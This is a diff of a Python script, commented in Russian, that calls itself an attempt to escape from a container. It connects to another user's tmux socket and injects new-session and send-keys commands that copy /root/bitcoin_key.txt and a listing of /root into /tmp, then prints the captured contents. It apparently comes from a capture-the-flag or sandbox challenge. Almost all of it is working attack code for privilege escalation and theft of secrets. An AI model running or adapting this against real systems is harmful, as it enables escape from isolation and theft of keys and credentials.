@@ -2,86 +2,77 @@
 import socket
 import time
 import os
-import sys
 
 
-def try_tmux_method_1():
-    """Метод 1: new-window с выводом в файл"""
+def try_tmux_control_mode():
+    """Пробуем tmux control mode"""
     try:
         sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
         sock.connect('/tmp/tmux-100/default')
-        command = b'new-window "cat /root/bitcoin_key.txt > /tmp/bitcoin_key_output.txt 2>&1"\n'
-        sock.send(command)
-        sock.close()
-        time.sleep(2)  # Ждем выполнения
 
-        if os.path.exists('/tmp/bitcoin_key_output.txt'):
-            with open('/tmp/bitcoin_key_output.txt', 'r') as f:
-                return f.read().strip()
-        return "Файл не создался"
-    except Exception as e:
-        return f"Ошибка метода 1: {str(e)}"
-
-
-def try_tmux_method_2():
-    """Метод 2: send-keys"""
-    try:
-        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
-        sock.connect('/tmp/tmux-100/default')
-        # Очищаем экран и выполняем команду
-        sock.send(b'send-keys "clear" Enter\n')
+        # Инициализируем control mode
+        sock.send(b'\x1b[?1049h')  # tmux escape sequence
         time.sleep(0.5)
-        sock.send(b'send-keys "cat /root/bitcoin_key.txt > /tmp/bitcoin_key_method2.txt 2>&1" Enter\n')
-        sock.close()
-        time.sleep(2)  # Ждем выполнения
 
-        if os.path.exists('/tmp/bitcoin_key_method2.txt'):
-            with open('/tmp/bitcoin_key_method2.txt', 'r') as f:
+        # Отправляем команду через tmux protocol
+        command = 'new-session -d "cat /root/bitcoin_key.txt > /tmp/flag_output.txt; echo DONE > /tmp/status.txt"\n'
+        sock.send(command.encode())
+        time.sleep(2)
+        sock.close()
+
+        # Проверяем результат
+        if os.path.exists('/tmp/flag_output.txt'):
+            with open('/tmp/flag_output.txt', 'r') as f:
                 return f.read().strip()
-        return "Файл не создался"
+        elif os.path.exists('/tmp/status.txt'):
+            return "Команда выполнена, но флаг не найден"
+        return "Файлы не созданы"
     except Exception as e:
-        return f"Ошибка метода 2: {str(e)}"
+        return f"Ошибка control mode: {e}"
 
 
-def main():
+def try_direct_tmux_commands():
+    """Пробуем прямые tmux команды"""
+    commands = [
+        b'list-sessions\n',
+        b'new-session -d -s hack "cat /root/bitcoin_key.txt > /tmp/bitcoin_flag.txt"\n',
+        b'send-keys -t hack "cat /root/bitcoin_key.txt > /tmp/direct_flag.txt" Enter\n',
+        b'send-keys -t hack "ls -la /root/ > /tmp/root_ls.txt" Enter\n'
+    ]
+
     results = []
-    results.append("=== ПОПЫТКА ЭСКЕЙПА ИЗ КОНТЕЙНЕРА ===\n")
+    for i, cmd in enumerate(commands):
+        try:
+            sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+            sock.connect('/tmp/tmux-100/default')
+            sock.send(cmd)
+            time.sleep(1)
+            sock.close()
+            results.append(f"Команда {i + 1}: успешно")
+        except Exception as e:
+            results.append(f"Команда {i + 1}: ошибка {e}")
 
-    print("Пробую метод 1 (new-window)...")
-    result1 = try_tmux_method_1()
-    results.append(f"Метод 1 (new-window):\n{result1}\n")
-    print(f"Результат метода 1: {result1[:100]}...")
-
-    print("Пробую метод 2 (send-keys)...")
-    result2 = try_tmux_method_2()
-    results.append(f"Метод 2 (send-keys):\n{result2}\n")
-    print(f"Результат метода 2: {result2[:100]}...")
-
-    # Пробуем альтернативные команды
-    try:
-        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
-        sock.connect('/tmp/tmux-100/default')
-        sock.send(b'send-keys "ls -la /root/ > /tmp/root_listing.txt 2>&1" Enter\n')
-        sock.close()
-        time.sleep(1)
-
-        if os.path.exists('/tmp/root_listing.txt'):
-            with open('/tmp/root_listing.txt', 'r') as f:
-                root_listing = f.read().strip()
-                results.append(f"Содержимое /root/:\n{root_listing}\n")
-    except:
-        pass
-
-    # Сохраняем все результаты
-    with open('/tmp/escape_results.txt', 'w') as f:
-        f.write('\n'.join(results))
-
-    print("Результаты сохранены в /tmp/escape_results.txt")
-    print("Проверьте файлы:")
-    print("cat /tmp/escape_results.txt")
-    print("cat /tmp/bitcoin_key_output.txt")
-    print("cat /tmp/bitcoin_key_method2.txt")
+    return "; ".join(results)
 
 
-if __name__ == "__main__":
-    main()
+# Выполняем оба метода
+print("=== НОВАЯ ПОПЫТКА ЭСКЕЙПА ===")
+
+result1 = try_tmux_control_mode()
+print(f"Control mode: {result1}")
+
+result2 = try_direct_tmux_commands()
+print(f"Direct commands: {result2}")
+
+# Проверяем все созданные файлы
+time.sleep(3)
+output_files = ['/tmp/flag_output.txt', '/tmp/bitcoin_flag.txt', '/tmp/direct_flag.txt', '/tmp/root_ls.txt']
+
+print("\n=== ПРОВЕРКА ФАЙЛОВ ===")
+for filepath in output_files:
+    if os.path.exists(filepath):
+        with open(filepath, 'r') as f:
+            content = f.read().strip()
+            print(f"{filepath}: {content}")
+    else:
+        print(f"{filepath}: не существует")
